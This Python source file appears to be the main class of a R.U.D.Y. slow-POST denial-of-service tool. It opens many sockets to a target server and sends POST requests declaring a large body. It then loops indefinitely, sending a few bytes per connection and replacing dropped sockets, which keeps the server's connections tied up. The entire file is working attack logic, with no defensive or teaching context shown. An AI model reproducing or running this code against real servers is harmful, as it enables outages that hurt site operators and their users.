import time

from typing_extensions import List

from rudy.logger import Logger
from rudy.args import Args
from rudy.socket import Socket
from rudy.http import Http


class Rudy:
  logger = Logger()
  sockets: List[Socket] = []

  def __init__(self, args: Args) -> None:
    self.logger.verbose(f"R U DEAD YET?\n{args.__str__()}")
    self.args = args
    
  def __init_sockets(self, count: int) -> None:
    self.logger.verbose(f"initialize sockets {count}")

    for _ in range(count):
      request = Http().create_request(
        "POST", 
        self.args.host, 
        self.args.path, 
        self.args.content_length
      )

      socket = Socket(
        self.args.host,
        self.args.port, 
        self.args.tls, 
        self.args.timeout
      ).create()

      if socket is None:
        continue

      if socket.send_request(request):
        self.sockets.append(socket)

  def __send_bytes(self, socket_count: int, byte_length: int, timeout: int) -> None:
    while True:
      self.logger.verbose(f"send {byte_length}bytes with {self.sockets.__len__()} sockets")

      for socket in self.sockets:
        if not socket.send_bytes(byte_length):
          self.sockets.remove(socket)

      self.__init_sockets(socket_count - self.sockets.__len__())
      
      time.sleep(timeout)

  def run(self) -> None:
    self.__init_sockets(self.args.socket_count)
    self.__send_bytes(
      self.args.socket_count, 
      self.args.byte_length,
      self.args.timeout
    )
    


